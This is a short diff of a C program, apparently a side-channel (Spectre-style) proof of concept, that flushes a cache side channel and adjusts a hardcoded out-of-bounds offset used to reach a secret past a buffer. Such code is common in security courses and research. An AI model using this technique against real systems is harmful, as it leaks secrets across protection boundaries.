@@ -125,7 +125,7 @@ int main() {
   // DO hacker stuff
   flushSideChannel();
   size_t larger_x = (size_t)(secret - (char*)buffer);  
-  larger_x = -8904;
+  larger_x = -8968;
   int consecutive_chars = 0;
   char tmpstr[STRLEN+1];
   for(int i = 0; i < STRLEN; i++){
